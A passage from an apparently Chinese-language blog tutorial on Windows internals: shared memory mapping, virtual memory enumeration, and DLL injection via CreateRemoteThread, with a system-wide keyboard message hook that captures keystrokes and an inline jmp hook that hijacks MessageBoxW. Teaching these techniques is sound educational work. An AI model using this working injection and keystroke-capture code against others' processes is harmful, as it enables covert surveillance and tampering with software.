class="built_in">OpenFileMapping</span>(FILE_MAP_ALL_ACCESS,</span><br><span class="line">FALSE, <span class="string">L&quot;hello 15pb&quot;</span>);</span><br><span class="line"><span class="comment">//2. 映射到内存</span></span><br><span class="line"><span class="type">char</span>* pBuf = (<span class="type">char</span>*)<span class="built_in">MapViewOfFile</span>(hMapFile, FILE_MAP_ALL_ACCESS,</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//3. 修改数据</span></span><br><span class="line">pBuf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//4. 通讯完毕，退出</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;数据已经更改完毕了&quot;</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hMapFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="虚拟内存的遍历"><a href="#虚拟内存的遍历" class="headerlink" title="虚拟内存的遍历"></a>虚拟内存的遍历</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SIZE_T WINAPI VirtualQueryEx(</span><br><span class="line">  _In_      HANDLE hProcess,   // 进程句柄</span><br><span class="line">  _In_opt_  LPCVOID lpAddress, // 查询地址</span><br><span class="line">  _Out_     PMEMORY_BASIC_INFORMATION lpBuffer,</span><br><span class="line">  _In_      SIZE_T dwLength    // 传出结构体的大小</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_MEMORY_BASIC_INFORMATION</span> &#123;</span><br><span class="line">    PVOID  BaseAddress;       <span class="comment">// 将参数向下取整到页面大小</span></span><br><span class="line">    PVOID  AllocationBase;    <span class="comment">// 区域地址，此区域包含传入地址</span></span><br><span class="line">    DWORD  AllocationProtect; <span class="comment">// 此区域在预定时的保护属性</span></span><br><span class="line">    SIZE_T RegionSize;        <span class="comment">// 区域的大小</span></span><br><span class="line">    DWORD  State;             <span class="comment">// 区域的页面状态[注1]</span></span><br><span class="line">    DWORD  Protect;           <span class="comment">// 页面保护属性</span></span><br><span class="line">    DWORD  Type;              <span class="comment">// 页面类型[注2]</span></span><br><span class="line">&#125; MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;</span><br></pre></td></tr></table></figure><h3 id="页面的状态"><a href="#页面的状态" class="headerlink" title="页面的状态"></a>页面的状态</h3><div class="table-container"><table><thead><tr><th><strong>状态</strong></th><th>值</th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>空闲的(Free)</td><td>0x00010000</td><td>进程不能访问这种页面，此页面还没有被分配。</td></tr><tr><td>保留的(reserve)</td><td>0x00002000</td><td>这个页面被预定了。但是还未与物理内存映射，因此这里也是不能访问的。</td></tr><tr><td>提交的(commit)</td><td>0x00001000</td><td>内存已经被分配了，并且也与物理存储器映射了，进程已经可以访问这里</td></tr></tbody></table></div><h3 id="页面类型"><a href="#页面类型" class="headerlink" title="页面类型"></a>页面类型</h3><div class="table-container"><table><thead><tr><th><strong>映射方式</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>private</td><td>进程私有内存,不被其他进程所<strong>共享</strong>, 一般是堆,栈</td></tr><tr><td>mapped</td><td>从别的进程内存映射而来</td></tr><tr><td>image</td><td>从程序的PE映像映射而来,一般是映像的区段.</td></tr></tbody></table></div><h3 id="遍历代码"><a href="#遍历代码" class="headerlink" title="遍历代码"></a>遍历代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;TlHelp32.h&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">using std::wstring;</span><br><span class="line">void EnumProcess();</span><br><span class="line">void EnumVirtualMemroy(HANDLE Process);</span><br><span class="line">MEMORY_BASIC_INFORMATION VirtualMemroy;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">EnumProcess();</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//遍历进程</span><br><span class="line">void EnumProcess()</span><br><span class="line">&#123;</span><br><span class="line">wstring buffer;</span><br><span class="line"></span><br><span class="line">// 2. 创建一个快照用于遍历进程，参数2可以留空</span><br><span class="line">HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);</span><br><span class="line"></span><br><span class="line">// 3. 创建一个用于保存进程信息的结构体</span><br><span class="line">PROCESSENTRY32 ProcessInfo = &#123; sizeof(PROCESSENTRY32) &#125;;</span><br><span class="line"></span><br><span class="line">// 4. 尝试遍历第一个进程的信息，成功就继续，失败就跳过</span><br><span class="line">if (Process32First(Snapshot, &amp;ProcessInfo))</span><br><span class="line">&#123;</span><br><span class="line">do &#123;</span><br><span class="line">// 5.5.2 通过指定的权限获取进程句柄</span><br><span class="line">HANDLE Process = OpenProcess(PROCESS_QUERY_INFORMATION,FALSE, ProcessInfo.th32ProcessID);</span><br><span class="line">if (Process&amp;&amp; Process != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">// 5.5.3 通过API查询到进程对应的Exe的路径，获取不到是因为权限不够</span><br><span class="line">//QueryFullProcessImageName(Process, 0, ImagePath, &amp;PathSize);</span><br><span class="line">printf(&quot;%ls\n&quot;, ProcessInfo.szExeFile);</span><br><span class="line">EnumVirtualMemroy(Process);</span><br><span class="line">// 5.5.4 关闭句柄并打印数据</span><br><span class="line">CloseHandle(Process);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 6. 尝试遍历进程快照内的下一个进程</span><br><span class="line">&#125; while (Process32Next(Snapshot, &amp;ProcessInfo));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//虚拟内存的遍历</span><br><span class="line">void EnumVirtualMemroy(HANDLE Process)</span><br><span class="line">&#123;</span><br><span class="line">int dwLength = sizeof(MEMORY_BASIC_INFORMATION);</span><br><span class="line">LPVOID Base = NULL;</span><br><span class="line">while (Base&lt;(LPVOID)0x7fffffff)</span><br><span class="line">&#123;</span><br><span class="line">VirtualQueryEx(Process, Base, &amp;VirtualMemroy, dwLength);</span><br><span class="line"></span><br><span class="line">Base = (LPVOID)((DWORD)Base + VirtualMemroy.RegionSize);</span><br><span class="line"></span><br><span class="line">printf(&quot;\t类型：%d\t属性：%d\t状态：%d\t大小：%d\n&quot;,</span><br><span class="line">VirtualMemroy.Type,</span><br><span class="line">VirtualMemroy.AllocationProtect,</span><br><span class="line">VirtualMemroy.State,</span><br><span class="line">VirtualMemroy.RegionSize</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Dll注入"><a href="#Dll注入" class="headerlink" title="Dll注入"></a>Dll注入</h1><p>注：职业黑客的必修课</p><p>重点内容）</p><p>1 什么是DLL注入？？为什么要DLL注入？？</p><p>在一个本来不需要加载此DLL的进程中，强行的使其加载此DLL文件。那么这个就叫做DLL注入技术。</p><p>我们在向一个进程中注入我们自己的DLL，相当于在对方的进程中加入了我们自己的代码，可以修改对方程序的功能。</p><p>游戏辅助，输入法，对于软件行为的拦截。</p><p>2 DLL注入的方式有哪些？？</p><p>远程线程注入</p><p>消息钩子注入</p><p>注册表注入</p><p>APC注入</p><p>输入法注入</p><h2 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#define DLLPATH  L&quot;DLL地址&quot;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">//通过ID获得目标句柄</span><br><span class="line">HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,9740);</span><br><span class="line">//先获取字符串长度</span><br><span class="line">int  nLength = wcslen(DLLPATH);</span><br><span class="line">//在目标进程中申请一块空间</span><br><span class="line">LPVOID address = VirtualAllocEx(hHandle,0, nLength*2+2,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">//将DLL名字写入到目标进程之前还需要一个参数是返回的实际写入大小</span><br><span class="line">DWORD dwConst = 0;</span><br><span class="line">//将DLL名字写入到目标进程空间</span><br><span class="line">WriteProcessMemory(hHandle, address,DLLPATH, nLength * 2 + 2, &amp;dwConst);</span><br><span class="line">//创建远程线程</span><br><span class="line">HANDLE hRhread = CreateRemoteThread(hHandle,0,0,(LPTHREAD_START_ROUTINE)LoadLibrary, address,0,0);</span><br><span class="line">//等待线程执行完成</span><br><span class="line">WaitForSingleObject(hRhread,-1);</span><br><span class="line">//销毁在目标进程申请的空间</span><br><span class="line">VirtualFreeEx(hHandle, address, nLength * 2 + 2,MEM_COMMIT);</span><br><span class="line">//线程计数-1</span><br><span class="line">CloseHandle(hRhread);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4 关于64位的注入</p><p>32位的dll正常情况只能注入到32位程序中，注入程序也应该是32位，64位的dll正常情况只能注入到64位的程序中，注入程序也应该是64位。</p><h2 id="消息钩子注入"><a href="#消息钩子注入" class="headerlink" title="消息钩子注入"></a>消息钩子注入</h2><p>什么是Hook，这个概念应该从何说起？？？</p><p>Hook：是钩子的意思</p><p>Hook技术主要指的是<strong>拦截</strong>程序原有的信息，数据，代码，</p><p>1 使得你有机会对拦截到的信息数据做处理。然后再交给原来的程序去使用，从而能够截获到程序的关键信息。可以查看，也可以修改。</p><p>2 能够修改程序的部分功能。</p><p>2 Hook是怎么分类的？？</p><p>在windows系统下，有两类Hook：</p><p>2.1 windows消息Hook。windows提供的能够让程序员截获到所有窗口程序消息的机制。</p><p> 消息Hook也是我们的一种Dll注入手段。</p><p>2.2 自定义Hook 非常普遍的Hook方式，也是我们通常意义所说的Hook。</p><p> 2.2.1 修改程序的代码，使得其能够执行到Hook者提供的“善意代码”中。 inline-Hook</p><p> 2.2.2 修改存储函数地址的变量，当程序从变量中获取函数地址并调用的时候，就会调用到Hook者提供的“善意代码”了。</p><p> IAT-Hook</p><p> IDT-Hook</p><p> SYSENTR-Hook</p><p>3 windows消息钩子的实现的原理以及代码</p><p>3.1 windows消息钩子的实现的原理</p><p>SetWindowsHookEx这个函数，能够实现的功能是截获 1 系统中所有的窗口程序的消息或者 2 某一个线程的窗口消息。</p><p>截获到了消息，必然是需要执行自己的代码，自己的代码需要放置在一个dll中，然后消息钩子设置成功之后，会将dll注入到目标进程，从而使得自己的回调函数能够在对方的进程中执行。</p><p>额外的知识点：窗口程序的消息是被某一个线程获取到的，哪一个线程创建了窗口，哪一个线程就能够获得此窗口的消息。此线程在创建完窗口之后，就变成了GUI线程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK <span class="title">SetWindowsHookExA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="type">int</span>       idHook,   <span class="comment">// 要截获的是哪种类型的消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">  HOOKPROC  lpfn,     <span class="comment">//截获到消息之后，调用的回调函数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  HINSTANCE hmod,     <span class="comment">//回调函数所在的模块，这个模块需要是一个dll。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD     dwThreadId  <span class="comment">//填0  截获系统中所有的窗口的消息  填线程ID  那就仅截获此线程的窗口消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//当钩子使用完毕之后，卸载钩子</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">UnhookWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HHOOK hhk      <span class="comment">//填充返回的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>在钩子的消息拦截函数的最后，应该调用这个函数，因为程序可能会有多个钩子，新添加的在最上面，为了不影响其他钩子的功能，需要调用这个函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINUSERAPI</span></span><br><span class="line"><span class="function">LRESULT</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CallNextHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ HHOOK hhk,    <span class="comment">//钩子的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ <span class="type">int</span> nCode,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPARAM lParam)</span></span>;</span><br></pre></td></tr></table></figure><p>消息钩子的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _countof(a) sizeof(a)/sizeof(a[0])</span></span><br><span class="line">HHOOK g_Hook = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//拦截消息的回调函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> code,           <span class="comment">// 消息类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">    WPARAM wParam,      <span class="comment">// 虚拟码</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPARAM lParam)</span> </span>&#123;    <span class="comment">// 按键信息</span></span><br><span class="line">    <span class="comment">// 判断是否wParam与lParam都有键盘消息，是的话则执行打印操作</span></span><br><span class="line">    <span class="keyword">if</span> (code == HC_ACTION) &#123;</span><br><span class="line">        <span class="comment">// 将256个虚拟键的状态拷贝到指定的缓冲区中，如果成功则继续</span></span><br><span class="line">        BYTE KeyState[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">GetKeyboardState</span>(KeyState)) &#123;</span><br><span class="line">            <span class="comment">// 得到第16–23位，键盘虚拟码</span></span><br><span class="line">            LONG  KeyInfo = lParam;</span><br><span class="line">            UINT  keyCode = (KeyInfo &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x00ff</span>;</span><br><span class="line">            WCHAR wKeyCode = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">ToAscii</span>((UINT)wParam, keyCode, KeyState, (LPWORD)&amp;wKeyCode, <span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 将其打印出来</span></span><br><span class="line">            WCHAR szInfo[<span class="number">512</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">            <span class="built_in">swprintf_s</span>(szInfo, _countof(szInfo), <span class="string">L&quot;Hook_%c&quot;</span>, (<span class="type">char</span>)wKeyCode);</span><br><span class="line">            <span class="built_in">OutputDebugString</span>(szInfo);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">CallNextHookEx</span>(g_Hook, code, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//开启Hook的函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hModule =  <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;MessageHookdll.dll&quot;</span>);</span><br><span class="line">    g_Hook = <span class="built_in">SetWindowsHookEx</span>(</span><br><span class="line">        WH_KEYBOARD,</span><br><span class="line">        KeyboardProc,</span><br><span class="line">        hModule,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//关闭Hook的函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_Hook!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">UnhookWindowsHookEx</span>(g_Hook);</span><br><span class="line">        g_Hook = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>消息钩子使用了调试函数 OutputDebugString(szInfo);输出按键码，但我们看不到对方程序的调试信息，可以通过下图程序查看</p><p><img src="/2020/06/21/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8B%A6%E6%88%AA/5.png" alt="image-5"></p><p>自定义钩子：</p><p>自定义钩子两大类：内联钩子 修改存储函数地址变量的钩子</p><p>4.1 什么是内联钩子 inline-Hook</p><p>任何位置，都可以修改为jmp，使其执行到此处时，能够跳转到我们自己的代码去执行：</p><p>1 被修改的指令，是否是有用的，如果是有用的，那么你就需要在你自己的代码中，将有用的指令写一遍，使其在你代码中能够执行。</p><p>2 jmp指令一般是5个字节，所以我们选取的指令最好也是5个字节，如果不是5个字节，那么会发生指令截断，跳转回来的时候，就需要考虑跳转到完整的指令后去执行程序本身的代码。</p><p>3 jmp指令OPCODE的操作数怎么求得，也是Hook的关键知识点</p><p>jmp指令OPCODE的操作数 = 要跳转的目标地址-hook点所在的地址-5</p><h2 id="DLL测试代码"><a href="#DLL测试代码" class="headerlink" title="DLL测试代码"></a>DLL测试代码</h2><h3 id="InLine-HOOK"><a href="#InLine-HOOK" class="headerlink" title="InLine_HOOK"></a>InLine_HOOK</h3><p>.h文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OnHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OffHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitHook</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>.cpp文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;HookMessageBox.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> g_NewCode[<span class="number">5</span>] = &#123; <span class="number">0xE9</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> g_OldCode[<span class="number">5</span>] = &#123;  &#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OffHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OnHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">MyMessageBoxW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ LPCWSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ LPCWSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">lpText = (<span class="type">wchar_t</span>*)<span class="string">L&quot;你被打劫了^_^&quot;</span>;</span><br><span class="line">DWORD dwReturnCode = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">OffHook</span>();</span><br><span class="line">dwReturnCode = <span class="built_in">MessageBoxW</span>(hWnd, lpText, lpCaption, uType);</span><br><span class="line"><span class="built_in">OnHook</span>();</span><br><span class="line"><span class="keyword">return</span> dwReturnCode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 得到Hook的指令</span></span><br><span class="line">DWORD dwOffset = (DWORD)MyMessageBoxW - (DWORD)MessageBoxW - <span class="number">5</span>;</span><br><span class="line"><span class="comment">//*(PDWORD)(code + 1) = dwOffset;</span></span><br><span class="line"><span class="built_in">memcpy</span>(g_NewCode + <span class="number">1</span>, &amp;dwOffset, <span class="number">4</span>);</span><br><span class="line"><span class="comment">//2 得到原始的指令</span></span><br><span class="line"><span class="built_in">memcpy</span>(g_OldCode, MessageBoxW, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1 修改Hook点的属性</span></span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(MessageBoxW, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"><span class="comment">//2 修改指令</span></span><br><span class="line"><span class="built_in">memcpy</span>(MessageBoxW, g_NewCode,<span class="number">5</span>);</span><br><span class="line"><span class="comment">//3 属性还原</span></span><br><span class="line"><span class="built_in">VirtualProtect</span>(MessageBoxW, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OffHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 改属性</span></span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(MessageBoxW, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"><span class="comment">//2 改指令</span></span><br><span class="line"><span class="built_in">memcpy</span>(MessageBoxW, g_OldCode, <span class="number">5</span>);</span><br><span class="line"><span class="comment">//3 属性还原</span></span><br><span class="line"><span class="built_in">VirtualProtect</span>(MessageBoxW, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dllmain.cpp文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;HookMessageBox.h&quot;</span></span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">InitHook</span>();</span><br><span class="line"><span class="built_in">OnHook</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">OffHook</span>();</span><br><span 